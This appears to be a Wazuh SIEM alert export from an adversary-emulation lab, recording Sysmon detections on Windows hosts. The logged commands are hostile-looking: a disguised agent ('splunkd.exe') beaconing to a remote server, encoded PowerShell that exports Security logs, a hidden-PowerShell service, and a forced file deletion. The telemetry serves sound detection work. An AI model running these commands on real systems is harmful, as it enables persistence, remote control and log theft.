User: DESKTOP-QGB4EQH\mari""",2,2024-11-30T08:03:45.911526500Z,56066,1760,DESKTOP-QGB4EQH,11,2356,INFORMATION,Microsoft-Windows-Sysmon,28,true,15,Executable file dropped in folder commonly used by malware,"[""sysmon"",""sysmon_eid11_detections"",""windows""]",92213, , ,windows_eventchannel,log,"Nov 30, 2024 @ 08:03:47.000",EventChannel,1732953827.2258681,"Nov 30, 2024 @ 08:03:47.000", , , , , , , , , , , , ,5284, , , , , , , , , , ,"[""Ingress Tool Transfer""]","[""T1105""]","[""Command and Control""]", , , , ,C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe, , , , , , ,{15959494-C6E1-674A-B706-000000000D00},2024-11-30 08:03:45.901, ,"technique_id=T1059.001,technique_name=PowerShell", , ,DESKTOP-QGB4EQH\\mari, , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , ,C:\\Users\\mari\\AppData\\Local\\Temp\\__PSScriptPolicyTest_114afrbm.pq4.ps1,2024-11-30 08:03:45.901, , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , 
wazuh-alerts-4.x-2024.11.30,YfoZfJMBRlc-D5DF1B8X,1,1,192.168.117.130,wazuh-agent,002,Maryam,"0, StoreAgentScanForUpdatesFailure0, Not available, 0, Update;, 800704cf, 17134, 165, Windows.Desktop,   \\\\?\\C:\\ProgramData\\Microsoft\\Windows\\WER\\Temp\\WERF6F3.tmp.WERInternalMetadata.xml  \\\\?\\C:\\ProgramData\\Microsoft\\Windows\\WER\\Temp\\WERF704.tmp.xml  \\\\?\\C:\\ProgramData\\Microsoft\\Windows\\WER\\Temp\\WERF712.tmp.csv  \\\\?\\C:\\ProgramData\\Microsoft\\Windows\\WER\\Temp\\WERF723.tmp.txt, C:\\ProgramData\\Microsoft\\Windows\\WER\\ReportQueue\\NonCritical_Update;_472d9f7221abece177a292950a88db68b87bb78_00000000_cab_1339f732, 0, de707373-c0a5-4ca4-98a4-2a3ea4c398b9, 4, 0",1001, ,0x80000000000000, ,4,Application, ,"""Fault bucket , type 0
Event Name: StoreAgentScanForUpdatesFailure0
Response: Not available
Cab Id: 0

Problem signature:
P1: Update;
P2: 800704cf
P3: 17134
P4: 165
P5: Windows.Desktop
P6: 
P7: 
P8: 
P9: 
P10: 

Attached files:
\\?\C:\ProgramData\Microsoft\Windows\WER\Temp\WERF6F3.tmp.WERInternalMetadata.xml
\\?\C:\ProgramData\Microsoft\Windows\WER\Temp\WERF704.tmp.xml
\\?\C:\ProgramData\Microsoft\Windows\WER\Temp\WERF712.tmp.csv
\\?\C:\ProgramData\Microsoft\Windows\WER\Temp\WERF723.tmp.txt

These files may be available here:
C:\ProgramData\Microsoft\Windows\WER\ReportQueue\NonCritical_Update;_472d9f7221abece177a292950a88db68b87bb78_00000000_cab_1339f732

Analysis symbol: 
Rechecking for solution: 0
Report Id: de707373-c0a5-4ca4-98a4-2a3ea4c398b9
Report Status: 4
Hashed bucket: 
Cab Guid: 0""", ,2024-11-30T08:04:38.349911600Z,1717, ,DESKTOP-FMI6MML,0, ,INFORMATION,Windows Error Reporting,13,false,4,Summary event of the report's signatures.,"[""windows"",""windows_application""]",60608, , ,windows_eventchannel,log,"Nov 30, 2024 @ 08:04:38.763",EventChannel,1732953878.2263287,"Nov 30, 2024 @ 08:04:38.763", , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , 
wazuh-alerts-4.x-2024.11.30,ZfoZfJMBRlc-D5DF1B8X,1,1,192.168.117.130,wazuh-agent,002,Maryam,"0, WindowsUpdateFailure3, Not available, 0, 10.0.17134.137, 800704cf, 00000000-0000-0000-0000-000000000000, Scan, 0, 0, 0, Update;ScanForUpdates, {855E8A7C-ECB4-4CA3-B045-1DFA50104289}, 0, 0, ea304e19-4279-406e-8ca9-e3c722933696, 1074003968, 0",1001, ,0x80000000000000, ,4,Application, ,"""Fault bucket , type 0
Event Name: WindowsUpdateFailure3
Response: Not available
Cab Id: 0

Problem signature:
P1: 10.0.17134.137
P2: 800704cf
P3: 00000000-0000-0000-0000-000000000000
P4: Scan
P5: 0
P6: 0
P7: 0
P8: Update;ScanForUpdates
P9: {855E8A7C-ECB4-4CA3-B045-1DFA50104289}
P10: 0

Attached files:

These files may be available here:


Analysis symbol: 
Rechecking for solution: 0
Report Id: ea304e19-4279-406e-8ca9-e3c722933696
Report Status: 1074003968
Hashed bucket: 
Cab Guid: 0""", ,2024-11-30T08:04:43.271820900Z,1719, ,DESKTOP-FMI6MML,0, ,INFORMATION,Windows Error Reporting,15,false,4,Summary event of the report's signatures.,"[""windows"",""windows_application""]",60608, , ,windows_eventchannel,log,"Nov 30, 2024 @ 08:04:43.691",EventChannel,1732953883.2286047,"Nov 30, 2024 @ 08:04:43.691", , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , 
wazuh-alerts-4.x-2024.11.30,WPoYfJMBRlc-D5DFIh9_,1,1,192.168.117.130,wazuh-agent,002,Maryam, ,36,volsnap,0x80000000000000,{cb017cd2-1f37-4e65-82bc-3e91f6a37559},2,System,0,"""The shadow copies of volume C: were aborted because the shadow copy storage could not grow due to a user imposed limit.""",0,2024-11-30T08:02:51.131046600Z,1796,300,DESKTOP-FMI6MML,0,4,ERROR,Volsnap,2,false,5,Windows System error event,"[""windows"",""windows_system"",""system_error""]",61102,"[""IV_35.7.d""]","[""4.3""]",windows_eventchannel,log,"Nov 30, 2024 @ 08:02:52.553",EventChannel,1732953772.2241334,"Nov 30, 2024 @ 08:02:52.553", , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , ,000000000600300000000000240006C0A40000000000000000000000000000000000000000000000, , , , , , , , , , , ,2587,00000000,C:,0x0005,164,\\Device\\HarddiskVolumeShadowCopy2, , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , 
wazuh-alerts-4.x-2024.11.30,RfoXfJMBRlc-D5DFAR9j,1,1,192.168.117.130,wazuh-agent,002,Maryam,"0, WindowsUpdateFailure3, Not available, 0, 10.0.17134.137, 800704cf, 00000000-0000-0000-0000-000000000000, Scan, 0, 0, 0, Update;ScanForUpdates, {855E8A7C-ECB4-4CA3-B045-1DFA50104289}, 0, 0, f3cd0d56-ed1b-41e4-8d6c-4446aad3597d, 1074003968, 0",1001, ,0x80000000000000, ,4,Application, ,"""Fault bucket , type 0
Event Name: WindowsUpdateFailure3
Response: Not available
Cab Id: 0

Problem signature:
P1: 10.0.17134.137
P2: 800704cf
P3: 00000000-0000-0000-0000-000000000000
P4: Scan
P5: 0
P6: 0
P7: 0
P8: Update;ScanForUpdates
P9: {855E8A7C-ECB4-4CA3-B045-1DFA50104289}
P10: 0

Attached files:

These files may be available here:


Analysis symbol: 
Rechecking for solution: 0
Report Id: f3cd0d56-ed1b-41e4-8d6c-4446aad3597d
Report Status: 1074003968
Hashed bucket: 
Cab Guid: 0""", ,2024-11-30T08:01:40.506295500Z,1695, ,DESKTOP-FMI6MML,0, ,INFORMATION,Windows Error Reporting,8,false,4,Summary event of the report's signatures.,"[""windows"",""windows_application""]",60608, , ,windows_eventchannel,log,"Nov 30, 2024 @ 08:01:40.931",EventChannel,1732953700.2180350,"Nov 30, 2024 @ 08:01:40.931", , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , 
wazuh-alerts-4.x-2024.11.30,SPoXfJMBRlc-D5DFBR9J,1,1,192.168.117.130,wazuh-agent,002,Maryam,"0, WindowsUpdateFailure3, Not available, 0, 10.0.17134.137, 800704cf, 00000000-0000-0000-0000-000000000000, Scan, 0, 0, 0, Windows Defender Antivirus (77BDAF73-B396-481F-9042-AD358843EC24), {8B24B027-1DEE-BABB-9A95-3517DFB9C552}, 0, 0, ec9f7ebe-c5b6-4626-ace3-ff8fc30495c2, 1074003968, 0",1001, ,0x80000000000000, ,4,Application, ,"""Fault bucket , type 0
Event Name: WindowsUpdateFailure3
Response: Not available
Cab Id: 0

Problem signature:
P1: 10.0.17134.137
P2: 800704cf
P3: 00000000-0000-0000-0000-000000000000
P4: Scan
P5: 0
P6: 0
P7: 0
P8: Windows Defender Antivirus (77BDAF73-B396-481F-9042-AD358843EC24)
P9: {8B24B027-1DEE-BABB-9A95-3517DFB9C552}
P10: 0

Attached files:

These files may be available here:


Analysis symbol: 
Rechecking for solution: 0
Report Id: ec9f7ebe-c5b6-4626-ace3-ff8fc30495c2
Report Status: 1074003968
Hashed bucket: 
Cab Guid: 0""", ,2024-11-30T08:01:41.709070000Z,1697, ,DESKTOP-FMI6MML,0, ,INFORMATION,Windows Error Reporting,10,false,4,Summary event of the report's signatures.,"[""windows"",""windows_application""]",60608, , ,windows_eventchannel,log,"Nov 30, 2024 @ 08:01:42.128",EventChannel,1732953702.2194430,"Nov 30, 2024 @ 08:01:42.128", , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , 
wazuh-alerts-4.x-2024.11.30,5PpAfJMBRlc-D5DFPB-0,1,1,192.168.117.134,window-agent3,003,Maryam, ,1, ,0x8000000000000000,{5770385F-C22A-43E0-BF4C-06F5698FFBD9},4,Microsoft-Windows-Sysmon/Operational,0,"""Process Create:
RuleName: technique_id=T1059.001,technique_name=PowerShell
UtcTime: 2024-11-30 08:46:35.737
ProcessGuid: {15959494-D0EB-674A-3707-000000000D00}
ProcessId: 7884
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
FileVersion: 10.0.17134.1 (WinBuild.160101.0800)
Description: Windows PowerShell
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
OriginalFileName: PowerShell.EXE
CommandLine: ""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"" -encodedCommand ZwBlAHQALQBlAHYAZQBuAHQAbABvAGcAIAAnAFMAZQBjAHUAcgBpAHQAeQAnACAAfAAgAHcAaABlAHIAZQAgAHsAJABfAC4ATQBlAHMAcwBhAGcAZQAgAC0AbABpAGsAZQAgACcAKgBTAFkAUwBUAEUATQAqACcAfQAgAHwAIABlAHgAcABvAHIAdAAtAGMAcwB2ACAAJABlAG4AdgA6AHQAZQBtAHAAXABUADEANgA1ADQAXwBlAHYAZQBuAHQAcwAuAHQAeAB0AA== -inputFormat xml -outputFormat text
CurrentDirectory: C:\Windows\system32\
User: DESKTOP-QGB4EQH\mari
LogonGuid: {15959494-D46B-6749-6B7A-100000000000}
LogonId: 0x107A6B
TerminalSessionId: 1
IntegrityLevel: High
Hashes: SHA1=1B3B40FBC889FD4C645CC12C85D0805AC36BA254,MD5=95000560239032BC68B4C2FDFCDEF913,SHA256=D3F8FADE829D2B7BD596C4504A6DAE5C034E789B6A3DEFBE013BDA7D14466677,IMPHASH=741776AACCFC5B71FF59832DCDCACE0F
ParentProcessGuid: {15959494-D0EB-674A-3607-000000000D00}
ParentProcessId: 7460
ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
ParentCommandLine: powershell.exe -ExecutionPolicy Bypass -C ""powershell -c {get-eventlog 'Security' | where {$_.Message -like '*SYSTEM*'} | export-csv $env:temp\T1654_events.txt}""
ParentUser: DESKTOP-QGB4EQH\mari""",5,2024-11-30T08:46:35.738578200Z,56900,1760,DESKTOP-QGB4EQH,1,2356,INFORMATION,Microsoft-Windows-Sysmon,1,true,12,Powershell.exe spawned a powershell process which executed a base64 encoded command,"[""sysmon"",""sysmon_eid1_detections"",""windows""]",92057, , ,windows_eventchannel,log,"Nov 30, 2024 @ 08:46:36.895",EventChannel,1732956396.2719966,"Nov 30, 2024 @ 08:46:36.895", , , , , , , ,{15959494-D46B-6749-6B7A-100000000000}, , , , ,7884, , , , , , , , , , ,"[""PowerShell""]","[""T1059.001""]","[""Execution""]", , , ,PowerShell.EXE,C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe,Microsoft® Windows® Operating System, , ,Windows PowerShell, , ,{15959494-D0EB-674A-3707-000000000D00},2024-11-30 08:46:35.737,"SHA1=1B3B40FBC889FD4C645CC12C85D0805AC36BA254,MD5=95000560239032BC68B4C2FDFCDEF913,SHA256=D3F8FADE829D2B7BD596C4504A6DAE5C034E789B6A3DEFBE013BDA7D14466677,IMPHASH=741776AACCFC5B71FF59832DCDCACE0F","technique_id=T1059.001,technique_name=PowerShell",Microsoft Corporation,10.0.17134.1 (WinBuild.160101.0800),DESKTOP-QGB4EQH\\mari, , , , , , , , , , , , , , , , , , , , , , , , , , ,{15959494-D0EB-674A-3607-000000000D00},"powershell.exe -ExecutionPolicy Bypass -C \""powershell -c {get-eventlog 'Security' | where {$_.Message -like '*SYSTEM*'} | export-csv $env:temp\\T1654_events.txt}\""",0x107a6b,7460,C:\\Windows\\system32\\,C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe,"\""C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\"" -encodedCommand ZwBlAHQALQBlAHYAZQBuAHQAbABvAGcAIAAnAFMAZQBjAHUAcgBpAHQAeQAnACAAfAAgAHcAaABlAHIAZQAgAHsAJABfAC4ATQBlAHMAcwBhAGcAZQAgAC0AbABpAGsAZQAgACcAKgBTAFkAUwBUAEUATQAqACcAfQAgAHwAIABlAHgAcABvAHIAdAAtAGMAcwB2ACAAJABlAG4AdgA6AHQAZQBtAHAAXABUADEANgA1ADQAXwBlAHYAZQBuAHQAcwAuAHQAeAB0AA== -inputFormat xml -outputFormat text",High,1,DESKTOP-QGB4EQH\\mari, , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , 
wazuh-alerts-4.x-2024.11.30,yfo3fJMBRlc-D5DF_x9M,1,1,192.168.117.134,window-agent3,003,Maryam, ,1, ,0x8000000000000000,{5770385F-C22A-43E0-BF4C-06F5698FFBD9},4,Microsoft-Windows-Sysmon/Operational,0,"""Process Create:
RuleName: technique_id=T1543.003,technique_name=Windows Service
UtcTime: 2024-11-30 08:37:33.880
ProcessGuid: {15959494-CECD-674A-2507-000000000D00}
ProcessId: 7888
Image: C:\Windows\System32\sc.exe
FileVersion: 10.0.17134.1 (WinBuild.160101.0800)
Description: Service Control Manager Configuration Tool
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
OriginalFileName: sc.exe
CommandLine: sc.exe  create ARTService binPath= ""C:\Windows\system32\cmd.exe /c powershell.exe -nop -w hidden -command New-Item -ItemType File C:\art-marker.txt"" 
CurrentDirectory: C:\Windows\system32\
User: DESKTOP-QGB4EQH\mari
LogonGuid: {15959494-D46B-6749-6B7A-100000000000}
LogonId: 0x107A6B
TerminalSessionId: 1
IntegrityLevel: High
Hashes: SHA1=72785E3068AA52CA223DA466595D3863AB6507AB,MD5=D79784553A9410D15E04766AAAB77CD6,SHA256=AEB241959F4A7B7C29F45D27FD65C5326F9592D25BADD1A7659DE0DA351BF96E,IMPHASH=7D296975925315BE8D57D0C67B133359
ParentProcessGuid: {15959494-CECD-674A-2407-000000000D00}
ParentProcessId: 7816
ParentImage: C:\Windows\System32\cmd.exe
ParentCommandLine: cmd.exe /C sc.exe create ARTService binPath= ""%COMSPEC% /c powershell.exe -nop -w hidden -command New-Item -ItemType File C:\art-marker.txt"" && sc.exe start ARTService && sc.exe delete ARTService
ParentUser: DESKTOP-QGB4EQH\mari""",5,2024-11-30T08:37:33.881147900Z,56735,1760,DESKTOP-QGB4EQH,1,2356,INFORMATION,Microsoft-Windows-Sysmon,3,false,3,Suspicious Windows cmd shell execution,"[""sysmon"",""sysmon_eid1_detections"",""windows""]",92032, , ,windows_eventchannel,log,"Nov 30, 2024 @ 08:37:34.961",EventChannel,1732955854.2617234,"Nov 30, 2024 @ 08:37:34.961", , , , , , , ,{15959494-D46B-6749-6B7A-100000000000}, , , , ,7888, , , , , , , , , , ,"[""Account Discovery"",""Windows Command Shell""]","[""T1087"",""T1059.003""]","[""Discovery"",""Execution""]", , , ,sc.exe,C:\\Windows\\System32\\sc.exe,Microsoft® Windows® Operating System, , ,Service Control Manager Configuration Tool, , ,{15959494-CECD-674A-2507-000000000D00},2024-11-30 08:37:33.880,"SHA1=72785E3068AA52CA223DA466595D3863AB6507AB,MD5=D79784553A9410D15E04766AAAB77CD6,SHA256=AEB241959F4A7B7C29F45D27FD65C5326F9592D25BADD1A7659DE0DA351BF96E,IMPHASH=7D296975925315BE8D57D0C67B133359","technique_id=T1543.003,technique_name=Windows Service",Microsoft Corporation,10.0.17134.1 (WinBuild.160101.0800),DESKTOP-QGB4EQH\\mari, , , , , , , , , , , , , , , , , , , , , , , , , , ,{15959494-CECD-674A-2407-000000000D00},"cmd.exe /C sc.exe create ARTService binPath= \""%COMSPEC% /c powershell.exe -nop -w hidden -command New-Item -ItemType File C:\\art-marker.txt\"" &amp;&amp; sc.exe start ARTService &amp;&amp; sc.exe delete ARTService",0x107a6b,7816,C:\\Windows\\system32\\,C:\\Windows\\System32\\cmd.exe,"sc.exe  create ARTService binPath= \""C:\\Windows\\system32\\cmd.exe /c powershell.exe -nop -w hidden -command New-Item -ItemType File C:\\art-marker.txt\""",High,1,DESKTOP-QGB4EQH\\mari, , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , 
wazuh-alerts-4.x-2024.11.30,3Po-fJMBRlc-D5DFjx8A,1,1,192.168.117.134,window-agent3,003,Maryam, ,1, ,0x8000000000000000,{5770385F-C22A-43E0-BF4C-06F5698FFBD9},4,Microsoft-Windows-Sysmon/Operational,0,"""Process Create:
RuleName: technique_id=T1059.003,technique_name=Windows Command Shell
UtcTime: 2024-11-30 08:44:51.594
ProcessGuid: {15959494-D083-674A-3307-000000000D00}
ProcessId: 712
Image: C:\Windows\System32\cmd.exe
FileVersion: 10.0.17134.1 (WinBuild.160101.0800)
Description: Windows Command Processor
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
OriginalFileName: Cmd.Exe
CommandLine: cmd.exe /C del /f %%temp%%\deleteme_T1551.004
CurrentDirectory: C:\Windows\system32\
User: DESKTOP-QGB4EQH\mari
LogonGuid: {15959494-D46B-6749-6B7A-100000000000}
LogonId: 0x107A6B
TerminalSessionId: 1
IntegrityLevel: High
Hashes: SHA1=3CE71813199ABAE99348F61F0CAA34E2574F831C,MD5=4E2ACF4F8A396486AB4268C94A6A245F,SHA256=9A7C58BD98D70631AA1473F7B57B426DB367D72429A5455B433A05EE251F3236,IMPHASH=8542FB14699D84D7E8DA92F66145C7FE
ParentProcessGuid: {15959494-D565-6749-1C01-000000000D00}
ParentProcessId: 7968
ParentImage: C:\Users\Public\splunkd.exe
ParentCommandLine: ""C:\Users\Public\splunkd.exe"" -server http://172.31.234.82:8888 -group red 
ParentUser: DESKTOP-QGB4EQH\mari""",5,2024-11-30T08:44:51.595994900Z,56868,1760,DESKTOP-QGB4EQH,1,2356,INFORMATION,Microsoft-Windows-Sysmon,10,false,4,Windows command prompt started by an abnormal process,"[""sysmon"",""sysmon_eid1_detections"",""windows""]",92052, , ,windows_eventchannel,log,"Nov 30, 2024 @ 08:44:52.674",EventChannel,1732956292.2707784,"Nov 30, 2024 @ 08:44:52.674", , , , , , , ,{15959494-D46B-6749-6B7A-100000000000}, , , , ,712, , , , , , , , , , ,"[""Windows Command Shell""]","[""T1059.003""]","[""Execution""]", , , ,Cmd.Exe,C:\\Windows\\System32\\cmd.exe,Microsoft® Windows® Operating System, , ,Windows Command Processor, , ,{15959494-D083-674A-3307-000000000D00},2024-11-30 08:44:51.594,"SHA1=3CE71813199ABAE99348F61F0CAA34E2574F831C,MD5=4E2ACF4F8A396486AB4268C94A6A245F,SHA256=9A7C58BD98D70631AA1473F7B57B426DB367D72429A5455B433A05EE251F3236,IMPHASH=8542FB14699D84D7E8DA92F66145C7FE","technique_id=T1059.003,technique_name=Windows Command Shell",Microsoft Corporation,10.0.17134.1 (WinBuild.160101.0800),DESKTOP-QGB4EQH\\mari, , , , , , , , , , , , , , , , , , , , , , , , , , ,{15959494-D565-6749-1C01-000000000D00},"\""C:\\Users\\Public\\splunkd.exe\"" -server http://172.31.234.82:8888 -group red",0x107a6b,7968,C:\\Windows\\system32\\,C:\\Users\\Public\\splunkd.exe,cmd.exe /C del /f %%temp%%\\deleteme_T1551.004,High,1,DESKTOP-QGB4EQH\\mari, , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , 
wazuh-alerts-4.x-2024.11.30,xvo2fJMBRlc-D5DFKh-H,1,1,192.168.117.134,window-agent3,003,Maryam, ,1, ,0x8000000000000000,{5770385F-C22A-43E0-BF4C-06F5698FFBD9},4,Microsoft-Windows-Sysmon/Operational,0,"""Process Create:
RuleName: technique_id=T1018,technique_name=Remote System Discovery
UtcTime: 2024-11-30 08:35:39.839
ProcessGuid: {15959494-CE5B-674A-2207-000000000D00}
ProcessId: 8156
Image: C:\Windows\System32\PING.EXE
FileVersion: 10.0.17134.1 (WinBuild.160101.0800)
Description: TCP/IP Ping Command
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
OriginalFileName: ping.exe
CommandLine: ping  -n 4 8.8.8.8
CurrentDirectory: C:\Windows\system32\
User: DESKTOP-QGB4EQH\mari
LogonGuid: {15959494-D46B-6749-6B7A-100000000000}
LogonId: 0x107A6B
TerminalSessionId: 1
IntegrityLevel: High
Hashes: SHA1=02DBA0A590629DEB688B743173496CE664C535FF,MD5=6A7389ECE70FB97BFE9A570DB4ACCC3B,SHA256=9B97C065BCA5FEAD86C951D9152A3D914DFCB1D9AC4D644FE1B0C7311489D4E3,IMPHASH=8C3BE1286CDAD6AC1136D0BB6C83FF41
ParentProcessGuid: {15959494-CE5B-674A-2107-000000000D00}
ParentProcessId: 6332
ParentImage: C:\Windows\System32\cmd.exe
ParentCommandLine: cmd.exe /C ping -n 4 8.8.8.8
ParentUser: DESKTOP-QGB4EQH\mari""",5,2024-11-30T08:35:39.841157500Z,56714,1760,DESKTOP-QGB4EQH,1,2356,INFORMATION,Microsoft-Windows-Sysmon,2,false,3,Suspicious Windows cmd shell execution,"[""sysmon"",""sysmon_eid1_detections"",""windows""]",92032, , ,windows_eventchannel,log,"Nov 30, 2024 @ 08:35:40.917",EventChannel,1732955740.2601608,"Nov 30, 2024 @ 08:35:40.917", , , , , , , ,{15959494-D46B-6749-6B7A-100000000000}, , , , ,8156, , , , , , , , , , ,"[""Account Discovery"",""Windows Command Shell""]","[""T1087"",""T1059.003""]","[""Discovery"",""Execution""]", , , ,ping.exe,C:\\Windows\\System32\\PING.EXE,Microsoft® Windows® Operating System, , ,TCP/IP Ping Command, , ,{15959494-CE5B-674A-2207-000000000D00},2024-11-30 08:35:39.839,"SHA1=02DBA0A590629DEB688B743173496CE664C535FF,MD5=6A7389ECE70FB97BFE9A570DB4ACCC3B,SHA256=9B97C065BCA5FEAD86C951D9152A3D914DFCB1D9AC4D644FE1B0C7311489D4E3,IMPHASH=8C3BE1286CDAD6AC1136D0BB6C83FF41","technique_id=T1018,technique_name=Remote System Discovery",Microsoft Corporation,10.0.17134.1 (WinBuild.160101.0800),DESKTOP-QGB4EQH\\mari, , , , , , , , , , , , , , , , , , , , , , , , , , ,{15959494-CE5B-674A-2107-000000000D00},cmd.exe /C ping -n 4 8.8.8.8,0x107a6b,6332,C:\\Windows\\system32\\,C:\\Windows\\System32\\cmd.exe,ping  -n 4 8.8.8.8,High,1,DESKTOP-QGB4EQH\\mari, , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , 
wazuh-alerts-4.x-2024.11.30,0vo7fJMBRlc-D5DFWh-m,1,1,192.168.117.134,window-agent3,003,Maryam, ,11, ,0x8000000000000000,{5770385F-C22A-43E0-BF4C-06F5698FFBD9},4,Microsoft-Windows-Sysmon/Operational,0,"""File created:
RuleName: technique_id=T1059.001,technique_name=PowerShell
UtcTime: 2024-11-30 08:41:12.944
ProcessGuid: {15959494-D565-6749-1C01-000000000D00}
ProcessId: 7968
Image: C:\Users\Public\splunkd.exe
TargetFilename: C:\Windows\System32\Emulate-Administrator-Tasks.ps1
CreationUtcTime: 2024-11-30 08:41:12.944
User: DESKTOP-QGB4EQH\mari""",2,2024-11-30T08:41:12.945776200Z,56784,1760,DESKTOP-QGB4EQH,11,2356,INFORMATION,Microsoft-Windows-Sysmon,1,false,6,Executable dropped in Windows root folder,"[""sysmon"",""sysmon_eid11_detections"",""windows""]",92217, , ,windows_eventchannel,log,"Nov 30, 2024 @ 08:41:14.010",EventChannel,1732956074.2666122,"Nov 30, 2024 @ 08:41:14.010", , , , , , , , , , , , ,7968, , , , , , , , , , ,"[""Lateral Tool Transfer""]","[""T1570""]","[""Lateral Movement""]", , , , ,C:\\Users\\Public\\splunkd.exe, , , , , , ,{15959494-D565-6749-1C01-000000000D00},2024-11-30 08:41:12.944, ,"technique_id=T1059.001,technique_name=PowerShell", , ,DESKTOP-QGB4EQH\\mari, , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , ,C:\\Windows\\System32\\Emulate-Administrator-Tasks.ps1,2024-11-30 08:41:12.944, , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , 
